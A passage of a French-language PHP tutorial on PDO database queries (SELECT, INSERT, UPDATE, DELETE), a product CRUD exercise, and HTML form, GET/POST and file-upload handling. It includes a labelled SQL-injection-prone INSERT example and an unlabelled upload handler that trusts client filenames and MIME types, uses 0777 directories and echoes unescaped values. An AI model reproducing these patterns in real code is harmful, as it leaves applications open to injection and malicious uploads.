    <p><code>SELECT</code> est la requ√™te la plus utilis√©e. C'est comme demander √† la base : <em>"Montre-moi ces informations !"</em></p>

    <h4>Syntaxe de base :</h4>
    <pre><code>SELECT colonnes FROM table WHERE conditions;</code></pre>

    <h4>Exemples simples :</h4>
    <pre><code><?php
require_once 'config.php';
$pdo = connecterDB();

// 1. R√©cup√©rer TOUS les √©tudiants
$sql = "SELECT * FROM etudiants";
$resultat = $pdo->query($sql);

echo "<h4>Tous les √©tudiants :</h4>";
while ($etudiant = $resultat->fetch()) {
    echo $etudiant['prenom'] . " " . $etudiant['nom'] . " (" . $etudiant['age'] . " ans)<br>";
}

// 2. R√©cup√©rer seulement certaines colonnes
$sql = "SELECT nom, prenom, email FROM etudiants";
$resultat = $pdo->query($sql);

echo "<h4>Noms et emails :</h4>";
while ($etudiant = $resultat->fetch()) {
    echo $etudiant['prenom'] . " " . $etudiant['nom'] . " - " . $etudiant['email'] . "<br>";
}
?></code></pre>

    <h4>SELECT avec conditions (WHERE) :</h4>
    <pre><code><?php
// √âtudiants de plus de 23 ans
$sql = "SELECT * FROM etudiants WHERE age > 23";
$resultat = $pdo->query($sql);

echo "<h4>√âtudiants de plus de 23 ans :</h4>";
while ($etudiant = $resultat->fetch()) {
    echo $etudiant['prenom'] . " " . $etudiant['nom'] . " (" . $etudiant['age'] . " ans)<br>";
}

// √âtudiant sp√©cifique par email
$sql = "SELECT * FROM etudiants WHERE email = 'jean.dupont@email.com'";
$resultat = $pdo->query($sql);
$etudiant = $resultat->fetch();

if ($etudiant) {
    echo "<h4>√âtudiant trouv√© :</h4>";
    echo $etudiant['prenom'] . " " . $etudiant['nom'];
} else {
    echo "Aucun √©tudiant avec cet email.";
}
?></code></pre>

    <h4>Conditions multiples et tri :</h4>
    <pre><code><?php
// √âtudiants de Paris ET de plus de 20 ans, tri√©s par nom
$sql = "SELECT * FROM etudiants 
        WHERE ville = 'Paris' AND age > 20 
        ORDER BY nom ASC";
$resultat = $pdo->query($sql);

// Recherche avec LIKE (recherche partielle)
$sql = "SELECT * FROM etudiants WHERE nom LIKE '%mart%'";
$resultat = $pdo->query($sql);

// Limiter le nombre de r√©sultats
$sql = "SELECT * FROM etudiants ORDER BY age DESC LIMIT 2";
$resultat = $pdo->query($sql);
?></code></pre>

    <h3>12.2 INSERT - Ajouter des donn√©es</h3>
    
    <p><code>INSERT</code> permet d'ajouter de nouveaux enregistrements dans la base. C'est comme remplir un nouveau formulaire d'inscription.</p>

    <h4>Syntaxe de base :</h4>
    <pre><code>INSERT INTO table (colonne1, colonne2, ...) VALUES (valeur1, valeur2, ...);</code></pre>

    <h4>M√©thode simple (attention aux injections SQL !) :</h4>
    <pre><code><?php
// ‚ö†Ô∏è DANGEREUX - Ne jamais faire comme √ßa en production !
$nom = "Durand";
$prenom = "Sophie";
$email = "sophie.durand@email.com";

$sql = "INSERT INTO etudiants (nom, prenom, email, age, ville) 
        VALUES ('$nom', '$prenom', '$email', 21, 'Lille')";

try {
    $pdo->exec($sql);
    echo "‚úÖ √âtudiant ajout√© avec succ√®s !";
} catch (PDOException $e) {
    echo "‚ùå Erreur : " . $e->getMessage();
}
?></code></pre>

    <h4>M√©thode s√©curis√©e avec requ√™tes pr√©par√©es :</h4>
    <pre><code><?php
// ‚úÖ S√âCURIS√â - Toujours faire comme √ßa !
function ajouterEtudiant($pdo, $nom, $prenom, $email, $age, $ville) {
    $sql = "INSERT INTO etudiants (nom, prenom, email, age, ville, date_inscription) 
            VALUES (:nom, :prenom, :email, :age, :ville, NOW())";
    
    try {
        $stmt = $pdo->prepare($sql);
        $stmt->execute([
            ':nom' => $nom,
            ':prenom' => $prenom,
            ':email' => $email,
            ':age' => $age,
            ':ville' => $ville
        ]);
        
        echo "‚úÖ √âtudiant ajout√© ! ID : " . $pdo->lastInsertId();
        return $pdo->lastInsertId();
        
    } catch (PDOException $e) {
        echo "‚ùå Erreur : " . $e->getMessage();
        return false;
    }
}

// Utilisation
$pdo = connecterDB();
ajouterEtudiant($pdo, "Moreau", "Julie", "julie.moreau@email.com", 19, "Bordeaux");
?></code></pre>

    <h4>Ajouter plusieurs enregistrements d'un coup :</h4>
    <pre><code><?php
function ajouterPlusieursEtudiants($pdo, $etudiants) {
    $sql = "INSERT INTO etudiants (nom, prenom, email, age, ville) VALUES ";
    $valeurs = [];
    $params = [];
    
    foreach ($etudiants as $i => $etudiant) {
        $valeurs[] = "(:nom$i, :prenom$i, :email$i, :age$i, :ville$i)";
        $params[":nom$i"] = $etudiant['nom'];
        $params[":prenom$i"] = $etudiant['prenom'];
        $params[":email$i"] = $etudiant['email'];
        $params[":age$i"] = $etudiant['age'];
        $params[":ville$i"] = $etudiant['ville'];
    }
    
    $sql .= implode(', ', $valeurs);
    
    try {
        $stmt = $pdo->prepare($sql);
        $stmt->execute($params);
        echo "‚úÖ " . count($etudiants) . " √©tudiants ajout√©s !";
    } catch (PDOException $e) {
        echo "‚ùå Erreur : " . $e->getMessage();
    }
}

// Utilisation
$nouveauxEtudiants = [
    ['nom' => 'Petit', 'prenom' => 'Alexandre', 'email' => 'alex.petit@email.com', 'age' => 20, 'ville' => 'Nice'],
    ['nom' => 'Grand', 'prenom' => 'Camille', 'email' => 'camille.grand@email.com', 'age' => 22, 'ville' => 'Toulouse']
];

ajouterPlusieursEtudiants($pdo, $nouveauxEtudiants);
?></code></pre>

    <h3>12.3 UPDATE - Modifier des donn√©es</h3>
    
    <p><code>UPDATE</code> permet de modifier des enregistrements existants. C'est comme corriger des informations sur un formulaire d√©j√† rempli.</p>

    <h4>Syntaxe de base :</h4>
    <pre><code>UPDATE table SET colonne1 = valeur1, colonne2 = valeur2 WHERE condition;</code></pre>

    <div style="background: #ffebee; border: 1px solid #f44336; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <strong>‚ö†Ô∏è ATTENTION :</strong> Toujours mettre une condition WHERE, sinon TOUS les enregistrements seront modifi√©s !
    </div>

    <h4>Exemples s√©curis√©s :</h4>
    <pre><code><?php
// Modifier l'√¢ge d'un √©tudiant sp√©cifique
function modifierAge($pdo, $id, $nouvelAge) {
    $sql = "UPDATE etudiants SET age = :age WHERE id = :id";
    
    try {
        $stmt = $pdo->prepare($sql);
        $stmt->execute([
            ':age' => $nouvelAge,
            ':id' => $id
        ]);
        
        $nbModifies = $stmt->rowCount();
        if ($nbModifies > 0) {
            echo "‚úÖ √Çge modifi√© pour $nbModifies √©tudiant(s)";
        } else {
            echo "‚ö†Ô∏è Aucun √©tudiant trouv√© avec cet ID";
        }
        
    } catch (PDOException $e) {
        echo "‚ùå Erreur : " . $e->getMessage();
    }
}

// Modifier plusieurs champs √† la fois
function modifierEtudiant($pdo, $id, $donnees) {
    $sql = "UPDATE etudiants SET nom = :nom, prenom = :prenom, email = :email, 
            age = :age, ville = :ville WHERE id = :id";
    
    try {
        $stmt = $pdo->prepare($sql);
        $donnees[':id'] = $id; // Ajouter l'ID aux donn√©es
        $stmt->execute($donnees);
        
        echo "‚úÖ √âtudiant modifi√© !";
        
    } catch (PDOException $e) {
        echo "‚ùå Erreur : " . $e->getMessage();
    }
}

// Utilisation
$pdo = connecterDB();
modifierAge($pdo, 1, 26);

$nouvellesDonnees = [
    ':nom' => 'Dupont-Martin',
    ':prenom' => 'Jean-Pierre', 
    ':email' => 'jp.dupont@email.com',
    ':age' => 26,
    ':ville' => 'Paris'
];
modifierEtudiant($pdo, 1, $nouvellesDonnees);
?></code></pre>

    <h4>Modifications conditionnelles :</h4>
    <pre><code><?php
// Augmenter l'√¢ge de tous les √©tudiants de Paris
$sql = "UPDATE etudiants SET age = age + 1 WHERE ville = 'Paris'";
$stmt = $pdo->prepare($sql);
$stmt->execute();
echo "√Çge augment√© pour " . $stmt->rowCount() . " √©tudiants parisiens";

// Changer la ville de tous les √©tudiants de moins de 20 ans
$sql = "UPDATE etudiants SET ville = 'Campus Junior' WHERE age < 20";
$stmt = $pdo->prepare($sql);
$stmt->execute();
echo "Ville chang√©e pour " . $stmt->rowCount() . " jeunes √©tudiants";
?></code></pre>

    <h3>12.4 DELETE - Supprimer des donn√©es</h3>
    
    <p><code>DELETE</code> supprime d√©finitivement des enregistrements. C'est irr√©versible, alors soyez tr√®s prudents !</p>

    <h4>Syntaxe de base :</h4>
    <pre><code>DELETE FROM table WHERE condition;</code></pre>

    <div style="background: #ffebee; border: 1px solid #f44336; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <strong>üö® DANGER :</strong> <code>DELETE FROM table</code> sans WHERE supprime TOUT ! Toujours v√©rifier votre requ√™te !
    </div>

    <h4>Suppressions s√©curis√©es :</h4>
    <pre><code><?php
// Supprimer un √©tudiant par son ID
function supprimerEtudiant($pdo, $id) {
    // D'abord, v√©rifier que l'√©tudiant existe
    $sql = "SELECT nom, prenom FROM etudiants WHERE id = :id";
    $stmt = $pdo->prepare($sql);
    $stmt->execute([':id' => $id]);
    $etudiant = $stmt->fetch();
    
    if (!$etudiant) {
        echo "‚ö†Ô∏è Aucun √©tudiant trouv√© avec l'ID $id";
        return false;
    }
    
    // Confirmation avant suppression
    echo "ü§î √ätes-vous s√ªr de vouloir supprimer {$etudiant['prenom']} {$etudiant['nom']} ?<br>";
    
    // Suppression effective
    $sql = "DELETE FROM etudiants WHERE id = :id";
    try {
        $stmt = $pdo->prepare($sql);
        $stmt->execute([':id' => $id]);
        
        if ($stmt->rowCount() > 0) {
            echo "‚úÖ √âtudiant supprim√© avec succ√®s";
        }
        
    } catch (PDOException $e) {
        echo "‚ùå Erreur : " . $e->getMessage();
    }
}

// Supprimer avec conditions multiples
function nettoyerAnciennesInscriptions($pdo) {
    $sql = "DELETE FROM etudiants 
            WHERE date_inscription < DATE_SUB(NOW(), INTERVAL 5 YEAR)";
    
    try {
        $stmt = $pdo->prepare($sql);
        $stmt->execute();
        
        $nbSupprimes = $stmt->rowCount();
        echo "üßπ $nbSupprimes anciennes inscriptions supprim√©es";
        
    } catch (PDOException $e) {
        echo "‚ùå Erreur : " . $e->getMessage();
    }
}
?></code></pre>

    <h3>12.5 Requ√™tes avanc√©es et bonnes pratiques</h3>
    
    <h4>Comptages et agr√©gations :</h4>
    <pre><code><?php
// Compter par ville
$sql = "SELECT ville, COUNT(*) as nombre 
        FROM etudiants 
        GROUP BY ville 
        ORDER BY nombre DESC";
$resultat = $pdo->query($sql);

echo "<h4>√âtudiants par ville :</h4>";
while ($ligne = $resultat->fetch()) {
    echo $ligne['ville'] . " : " . $ligne['nombre'] . " √©tudiant(s)<br>";
}

// Statistiques sur l'√¢ge
$sql = "SELECT 
            COUNT(*) as total,
            AVG(age) as age_moyen,
            MIN(age) as plus_jeune,
            MAX(age) as plus_age
        FROM etudiants";
$stats = $pdo->query($sql)->fetch();

echo "<h4>Statistiques :</h4>";
echo "Total : " . $stats['total'] . "<br>";
echo "√Çge moyen : " . round($stats['age_moyen'], 1) . " ans<br>";
echo "Plus jeune : " . $stats['plus_jeune'] . " ans<br>";
echo "Plus √¢g√© : " . $stats['plus_age'] . " ans<br>";
?></code></pre>

    <h4>Recherche et pagination :</h4>
    <pre><code><?php
function rechercherEtudiants($pdo, $terme, $page = 1, $parPage = 5) {
    $offset = ($page - 1) * $parPage;
    
    $sql = "SELECT * FROM etudiants 
            WHERE nom LIKE :terme OR prenom LIKE :terme OR email LIKE :terme
            ORDER BY nom, prenom
            LIMIT :limit OFFSET :offset";
    
    try {
        $stmt = $pdo->prepare($sql);
        $stmt->bindValue(':terme', "%$terme%", PDO::PARAM_STR);
        $stmt->bindValue(':limit', $parPage, PDO::PARAM_INT);
        $stmt->bindValue(':offset', $offset, PDO::PARAM_INT);
        $stmt->execute();
        
        $resultats = $stmt->fetchAll();
        
        // Compter le total pour la pagination
        $sqlCount = "SELECT COUNT(*) FROM etudiants 
                     WHERE nom LIKE :terme OR prenom LIKE :terme OR email LIKE :terme";
        $stmtCount = $pdo->prepare($sqlCount);
        $stmtCount->execute([':terme' => "%$terme%"]);
        $total = $stmtCount->fetchColumn();
        
        return [
            'resultats' => $resultats,
            'total' => $total,
            'page' => $page,
            'totalPages' => ceil($total / $parPage)
        ];
        
    } catch (PDOException $e) {
        echo "‚ùå Erreur de recherche : " . $e->getMessage();
        return false;
    }
}

// Utilisation
$recherche = rechercherEtudiants($pdo, "martin", 1, 3);
if ($recherche) {
    echo "<h4>R√©sultats pour 'martin' :</h4>";
    foreach ($recherche['resultats'] as $etudiant) {
        echo $etudiant['prenom'] . " " . $etudiant['nom'] . "<br>";
    }
    echo "<p>Page {$recherche['page']} sur {$recherche['totalPages']}</p>";
}
?></code></pre>

    <h3>12.6 Exercice pratique : CRUD complet</h3>
    
    <p><strong>Objectif :</strong> Cr√©er un syst√®me CRUD (Create, Read, Update, Delete) complet pour g√©rer des produits.</p>
    
    <p><strong>Cr√©ez ces fonctions :</strong></p>
    <ol>
        <li><code>ajouterProduit($nom, $prix, $stock, $categorie)</code></li>
        <li><code>listerProduits($categorie = null)</code></li>
        <li><code>obtenirProduit($id)</code></li>
        <li><code>modifierProduit($id, $donnees)</code></li>
        <li><code>supprimerProduit($id)</code></li>
        <li><code>rechercherProduits($terme)</code></li>
        <li><code>statistiquesProduits()</code></li>
    </ol>

    <p><strong>Testez toutes les fonctions avec des donn√©es r√©elles.</strong></p>

    <details>
        <summary><strong>üí° Voir la solution</strong></summary>
        <pre><code><?php
require_once 'config.php';

class GestionnaireProduits {
    private $pdo;
    
    public function __construct() {
        $this->pdo = connecterDB();
    }
    
    public function ajouterProduit($nom, $prix, $stock, $categorie) {
        $sql = "INSERT INTO produits (nom, prix, stock, categorie) 
                VALUES (:nom, :prix, :stock, :categorie)";
        
        try {
            $stmt = $this->pdo->prepare($sql);
            $stmt->execute([
                ':nom' => $nom,
                ':prix' => $prix,
                ':stock' => $stock,
                ':categorie' => $categorie
            ]);
            
            echo "‚úÖ Produit ajout√© ! ID : " . $this->pdo->lastInsertId() . "<br>";
            return $this->pdo->lastInsertId();
            
        } catch (PDOException $e) {
            echo "‚ùå Erreur : " . $e->getMessage() . "<br>";
            return false;
        }
    }
    
    public function listerProduits($categorie = null) {
        if ($categorie) {
            $sql = "SELECT * FROM produits WHERE categorie = :categorie ORDER BY nom";
            $stmt = $this->pdo->prepare($sql);
            $stmt->execute([':categorie' => $categorie]);
        } else {
            $sql = "SELECT * FROM produits ORDER BY nom";
            $stmt = $this->pdo->query($sql);
        }
        
        return $stmt->fetchAll();
    }
    
    public function obtenirProduit($id) {
        $sql = "SELECT * FROM produits WHERE id = :id";
        $stmt = $this->pdo->prepare($sql);
        $stmt->execute([':id' => $id]);
        
        return $stmt->fetch();
    }
    
    public function modifierProduit($id, $donnees) {
        $sql = "UPDATE produits SET nom = :nom, prix = :prix, 
                stock = :stock, categorie = :categorie WHERE id = :id";
        
        try {
            $stmt = $this->pdo->prepare($sql);
            $donnees[':id'] = $id;
            $stmt->execute($donnees);
            
            if ($stmt->rowCount() > 0) {
                echo "‚úÖ Produit modifi√© !<br>";
                return true;
            } else {
                echo "‚ö†Ô∏è Aucun produit trouv√© avec cet ID<br>";
                return false;
            }
            
        } catch (PDOException $e) {
            echo "‚ùå Erreur : " . $e->getMessage() . "<br>";
            return false;
        }
    }
    
    public function supprimerProduit($id) {
        // V√©rifier que le produit existe
        $produit = $this->obtenirProduit($id);
        if (!$produit) {
            echo "‚ö†Ô∏è Produit non trouv√©<br>";
            return false;
        }
        
        $sql = "DELETE FROM produits WHERE id = :id";
        try {
            $stmt = $this->pdo->prepare($sql);
            $stmt->execute([':id' => $id]);
            
            echo "‚úÖ Produit '{$produit['nom']}' supprim√©<br>";
            return true;
            
        } catch (PDOException $e) {
            echo "‚ùå Erreur : " . $e->getMessage() . "<br>";
            return false;
        }
    }
    
    public function rechercherProduits($terme) {
        $sql = "SELECT * FROM produits 
                WHERE nom LIKE :terme OR description LIKE :terme
                ORDER BY nom";
        
        $stmt = $this->pdo->prepare($sql);
        $stmt->execute([':terme' => "%$terme%"]);
        
        return $stmt->fetchAll();
    }
    
    public function statistiquesProduits() {
        $sql = "SELECT 
                    COUNT(*) as total_produits,
                    SUM(stock) as stock_total,
                    AVG(prix) as prix_moyen,
                    categorie,
                    COUNT(*) as nb_par_categorie
                FROM produits 
                GROUP BY categorie";
        
        $stats = $this->pdo->query($sql)->fetchAll();
        
        echo "<h4>üìä Statistiques des produits :</h4>";
        foreach ($stats as $stat) {
            echo "Cat√©gorie {$stat['categorie']} : {$stat['nb_par_categorie']} produits<br>";
        }
        
        return $stats;
    }
}

// Tests
$gestion = new GestionnaireProduits();

// Test ajout
$gestion->ajouterProduit("MacBook Pro", 2499.99, 5, "electronique");
$gestion->ajouterProduit("iPhone 15", 1199.99, 10, "electronique");

// Test listing
echo "<h4>üìã Tous les produits :</h4>";
$produits = $gestion->listerProduits();
foreach ($produits as $produit) {
    echo $produit['nom'] . " - " . $produit['prix'] . "‚Ç¨ (Stock: {$produit['stock']})<br>";
}

// Test recherche
echo "<h4>üîç Recherche 'phone' :</h4>";
$resultats = $gestion->rechercherProduits("phone");
foreach ($resultats as $produit) {
    echo $produit['nom'] . "<br>";
}

// Test modification
$gestion->modifierProduit(1, [
    ':nom' => 'MacBook Pro M3',
    ':prix' => 2299.99,
    ':stock' => 3,
    ':categorie' => 'electronique'
]);

// Statistiques
$gestion->statistiquesProduits();
?></code></pre>
    </details>
</section>

<!-- Partie 13: Formulaires HTML et traitement en PHP -->
<section class="part13">
    <h2>13. Formulaires HTML et traitement en PHP</h2>
    
    <p>Les formulaires sont le <strong>pont</strong> entre vos visiteurs et votre site web ! C'est gr√¢ce √† eux que les utilisateurs peuvent s'inscrire, se connecter, commander des produits, laisser des commentaires... Sans formulaires, votre site serait comme un mus√©e : beau √† regarder, mais pas d'interaction !</p>

    <p>PHP est le <strong>r√©ceptionniste</strong> qui traite toutes les informations envoy√©es par les formulaires HTML.</p>

    <h3>13.1 Rappel des formulaires HTML</h3>
    
    <p>Avant de traiter les donn√©es en PHP, rappelons-nous comment cr√©er un formulaire HTML correct.</p>

    <h4>Structure de base d'un formulaire :</h4>
    <pre><code>&lt;form method="POST" action="traitement.php"&gt;
    &lt;!-- Champs du formulaire --&gt;
    &lt;input type="submit" value="Envoyer"&gt;
&lt;/form&gt;</code></pre>

    <h4>Exemple complet : Formulaire d'inscription</h4>
    <pre><code>&lt;!-- inscription.html --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Inscription&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h2&gt;üìù Formulaire d'inscription&lt;/h2&gt;
    
    &lt;form method="POST" action="traiter_inscription.php"&gt;
        &lt;div&gt;
            &lt;label for="nom"&gt;Nom :&lt;/label&gt;
            &lt;input type="text" id="nom" name="nom" required&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label for="email"&gt;Email :&lt;/label&gt;
            &lt;input type="email" id="email" name="email" required&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label for="age"&gt;√Çge :&lt;/label&gt;
            &lt;input type="number" id="age" name="age" min="13" max="120"&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label for="ville"&gt;Ville :&lt;/label&gt;
            &lt;select id="ville" name="ville"&gt;
                &lt;option value=""&gt;Choisissez...&lt;/option&gt;
                &lt;option value="paris"&gt;Paris&lt;/option&gt;
                &lt;option value="lyon"&gt;Lyon&lt;/option&gt;
                &lt;option value="marseille"&gt;Marseille&lt;/option&gt;
            &lt;/select&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label&gt;Centres d'int√©r√™t :&lt;/label&gt;
            &lt;input type="checkbox" id="sport" name="interets[]" value="sport"&gt;
            &lt;label for="sport"&gt;Sport&lt;/label&gt;
            
            &lt;input type="checkbox" id="musique" name="interets[]" value="musique"&gt;
            &lt;label for="musique"&gt;Musique&lt;/label&gt;
            
            &lt;input type="checkbox" id="lecture" name="interets[]" value="lecture"&gt;
            &lt;label for="lecture"&gt;Lecture&lt;/label&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label for="commentaire"&gt;Commentaire :&lt;/label&gt;
            &lt;textarea id="commentaire" name="commentaire" rows="4"&gt;&lt;/textarea&gt;
        &lt;/div&gt;
        
        &lt;button type="submit"&gt;S'inscrire&lt;/button&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>

    <h3>13.2 GET vs POST : Quelle m√©thode choisir ?</h3>
    
    <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <h4>üìÆ M√©thode POST :</h4>
        <p><strong>Utiliser pour :</strong> Envoi de donn√©es sensibles, inscription, connexion, commandes...</p>
        <ul>
            <li>‚úÖ Les donn√©es ne sont <strong>pas visibles</strong> dans l'URL</li>
            <li>‚úÖ Peut envoyer <strong>beaucoup de donn√©es</strong></li>
            <li>‚úÖ Plus <strong>s√©curis√©</strong> pour les mots de passe</li>
            <li>‚úÖ Peut envoyer des <strong>fichiers</strong></li>
        </ul>

        <h4>üîó M√©thode GET :</h4>
        <p><strong>Utiliser pour :</strong> Recherches, filtres, liens partageables...</p>
        <ul>
            <li>‚úÖ Les donn√©es sont <strong>visibles</strong> dans l'URL</li>
            <li>‚úÖ Peut √™tre <strong>mise en favoris</strong></li>
            <li>‚ùå Limit√© en <strong>taille</strong> (environ 2000 caract√®res)</li>
            <li>‚ùå <strong>Pas s√©curis√©</strong> pour les donn√©es sensibles</li>
        </ul>
    </div>

    <h4>Exemples d'URLs avec GET :</h4>
    <pre><code>// Recherche de produits
https://monsite.com/recherche.php?terme=smartphone&amp;prix_max=500

// Pagination
https://monsite.com/articles.php?page=2&amp;categorie=tech</code></pre>

    <h3>13.3 Traitement des donn√©es POST</h3>
    
    <p>Quand un formulaire est envoy√© en POST, PHP re√ßoit les donn√©es dans la variable sp√©ciale <code>$_POST</code>.</p>

    <h4>Fichier traiter_inscription.php :</h4>
    <pre><code>&lt;?php
// V√©rifier que le formulaire a √©t√© envoy√©
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // R√©cup√©rer les donn√©es envoy√©es
    $nom = $_POST['nom'] ?? '';
    $email = $_POST['email'] ?? '';
    $age = $_POST['age'] ?? '';
    $ville = $_POST['ville'] ?? '';
    $interets = $_POST['interets'] ?? [];
    $commentaire = $_POST['commentaire'] ?? '';
    
    // Afficher les donn√©es re√ßues
    echo "&lt;h2&gt;‚úÖ Inscription re√ßue !&lt;/h2&gt;";
    echo "&lt;p&gt;&lt;strong&gt;Nom :&lt;/strong&gt; " . htmlspecialchars($nom) . "&lt;/p&gt;";
    echo "&lt;p&gt;&lt;strong&gt;Email :&lt;/strong&gt; " . htmlspecialchars($email) . "&lt;/p&gt;";
    echo "&lt;p&gt;&lt;strong&gt;√Çge :&lt;/strong&gt; " . $age . " ans&lt;/p&gt;";
    echo "&lt;p&gt;&lt;strong&gt;Ville :&lt;/strong&gt; " . htmlspecialchars($ville) . "&lt;/p&gt;";
    
    // Traitement des cases √† cocher (tableau)
    if (!empty($interets)) {
        echo "&lt;p&gt;&lt;strong&gt;Centres d'int√©r√™t :&lt;/strong&gt; " . implode(", ", $interets) . "&lt;/p&gt;";
    }
    
    if (!empty($commentaire)) {
        echo "&lt;p&gt;&lt;strong&gt;Commentaire :&lt;/strong&gt;&lt;br&gt;" . nl2br(htmlspecialchars($commentaire)) . "&lt;/p&gt;";
    }
    
} else {
    echo "&lt;p&gt;‚ùå Aucune donn√©e re√ßue.&lt;/p&gt;";
}
?&gt;</code></pre>

    <div style="background: #fff3cd; border: 1px solid #ffc107; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <strong>üõ°Ô∏è S√©curit√© :</strong> Notez l'utilisation de <code>htmlspecialchars()</code> pour √©viter les attaques XSS !
    </div>

    <h3>13.4 Traitement des donn√©es GET</h3>
    
    <h4>Formulaire de recherche (GET) :</h4>
    <pre><code>&lt;!-- recherche.html --&gt;
&lt;form method="GET" action="resultats.php"&gt;
    &lt;input type="text" name="q" placeholder="Rechercher..."&gt;
    
    &lt;select name="categorie"&gt;
        &lt;option value=""&gt;Toutes cat√©gories&lt;/option&gt;
        &lt;option value="electronique"&gt;√âlectronique&lt;/option&gt;
        &lt;option value="vetement"&gt;V√™tements&lt;/option&gt;
        &lt;option value="livre"&gt;Livres&lt;/option&gt;
    &lt;/select&gt;
    
    &lt;input type="number" name="prix_max" placeholder="Prix max"&gt;
    
    &lt;button type="submit"&gt;üîç Rechercher&lt;/button&gt;
&lt;/form&gt;</code></pre>

    <h4>Traitement de la recherche :</h4>
    <pre><code>&lt;?php
// resultats.php
$terme = $_GET['q'] ?? '';
$categorie = $_GET['categorie'] ?? '';
$prixMax = $_GET['prix_max'] ?? '';

echo "&lt;h2&gt;üîç R√©sultats de recherche&lt;/h2&gt;";

if (!empty($terme)) {
    echo "&lt;p&gt;Recherche pour : &lt;strong&gt;" . htmlspecialchars($terme) . "&lt;/strong&gt;&lt;/p&gt;";
}

if (!empty($categorie)) {
    echo "&lt;p&gt;Cat√©gorie : &lt;strong&gt;" . htmlspecialchars($categorie) . "&lt;/strong&gt;&lt;/p&gt;";
}

if (!empty($prixMax)) {
    echo "&lt;p&gt;Prix maximum : &lt;strong&gt;" . $prixMax . "‚Ç¨&lt;/strong&gt;&lt;/p&gt;";
}

// Ici, vous feriez une vraie recherche en base de donn√©es
// En utilisant les param√®tres re√ßus
?&gt;</code></pre>

    <h3>13.5 Upload de fichiers</h3>
    
    <p>PHP peut aussi recevoir des fichiers envoy√©s par les utilisateurs (photos, documents, etc.).</p>

    <h4>Formulaire d'upload :</h4>
    <pre><code>&lt;!-- IMPORTANT : enctype="multipart/form-data" pour les fichiers ! --&gt;
&lt;form method="POST" action="upload.php" enctype="multipart/form-data"&gt;
    &lt;div&gt;
        &lt;label for="nom"&gt;Votre nom :&lt;/label&gt;
        &lt;input type="text" id="nom" name="nom" required&gt;
    &lt;/div&gt;
    
    &lt;div&gt;
        &lt;label for="photo"&gt;Photo de profil :&lt;/label&gt;
        &lt;input type="file" id="photo" name="photo" accept="image/*"&gt;
    &lt;/div&gt;
    
    &lt;div&gt;
        &lt;label for="cv"&gt;CV (PDF) :&lt;/label&gt;
        &lt;input type="file" id="cv" name="cv" accept=".pdf"&gt;
    &lt;/div&gt;
    
    &lt;button type="submit"&gt;üì§ Envoyer&lt;/button&gt;
&lt;/form&gt;</code></pre>

    <h4>Traitement de l'upload :</h4>
    <pre><code>&lt;?php
// upload.php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $nom = $_POST['nom'] ?? '';
    
    echo "&lt;h2&gt;üì§ Upload pour : " . htmlspecialchars($nom) . "&lt;/h2&gt;";
    
    // Traitement de la photo
    if (isset($_FILES['photo']) && $_FILES['photo']['error'] === UPLOAD_ERR_OK) {
        $photo = $_FILES['photo'];
        
        echo "&lt;h3&gt;üì∏ Photo re√ßue :&lt;/h3&gt;";
        echo "&lt;p&gt;Nom : " . $photo['name'] . "&lt;/p&gt;";
        echo "&lt;p&gt;Taille : " . number_format($photo['size'] / 1024, 2) . " Ko&lt;/p&gt;";
        echo "&lt;p&gt;Type : " . $photo['type'] . "&lt;/p&gt;";
        
        // D√©finir o√π sauvegarder le fichier
        $dossierUpload = 'uploads/photos/';
        if (!is_dir($dossierUpload)) {
            mkdir($dossierUpload, 0777, true);
        }
        
        // G√©n√©rer un nom unique pour √©viter les conflits
        $nomFichier = uniqid() . '_' . $photo['name'];
        $cheminComplet = $dossierUpload . $nomFichier;
        
        // D√©placer le fichier temporaire vers sa destination finale
        if (move_uploaded_file($photo['tmp_name'], $cheminComplet)) {
            echo "&lt;p&gt;‚úÖ Photo sauvegard√©e avec succ√®s !&lt;/p&gt;";
            echo "&lt;img src='$cheminComplet' style='max-width: 200px;'&gt;";
        } else {
            echo "&lt;p&gt;‚ùå Erreur lors de la sauvegarde de la photo.&lt;/p&gt;";
        }
    }
    
    // Traitement du CV
    if (isset($_FILES['cv']) && $_FILES['cv']['error'] === UPLOAD_ERR_OK) {
        $cv = $_FILES['cv'];
        
        echo "&lt;h3&gt;üìÑ CV re√ßu :&lt;/h3&gt;";
        echo "&lt;p&gt;Nom : " . $cv['name'] . "&lt;/p&gt;";
        echo "&lt;p&gt;Taille : " . number_format($cv['size'] / 1024, 2) . " Ko&lt;/p&gt;";
        
        // V√©rifier que c'est bien un PDF
        if ($cv['type'] === 'application/pdf') {
            $dossierCV = 'uploads/cv/';
            if (!is_dir($dossierCV)) {
                mkdir($dossierCV, 0777, true);
            }
            
            $nomCV = uniqid() . '_' . $cv['name'];
            $cheminCV = $dossierCV . $nomCV;
            
            if (move_uploaded_file($cv['tmp_name'], $cheminCV)) {
                echo "&lt;p&gt;‚úÖ CV sauvegard√© avec succ√®s !&lt;/p&gt;";
            } else {
                echo "&lt;p&gt;‚ùå Erreur lors de la sauvegarde du CV.&lt;/p&gt;";
            }
        } else {
            echo "&lt;p&gt;‚ùå Le fichier doit √™tre un PDF.&lt;/p&gt;";
        }
    }
}
?&gt;</code></pre>

    <h3>13.6 Formulaire avec pr√©-remplissage</h3>
    
    <p>Parfois, on veut modifier des donn√©es existantes. Il faut alors pr√©-remplir le formulaire.</p>

    <pre><code>&lt;?php
// modifier_profil.php
// Supposons qu'on r√©cup√®re les donn√©es depuis la base
$utilisateur = [
    'nom' => 'Dupont',
    'email' => 'dupont@email.com',
    'age' => 25,
    'ville' => 'paris',
    'interets' => ['sport', 'lecture']
];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Traitement de la modification
    echo "&lt;div style='background: #d4edda; padding: 10px; border-radius: 5px;'&gt;";
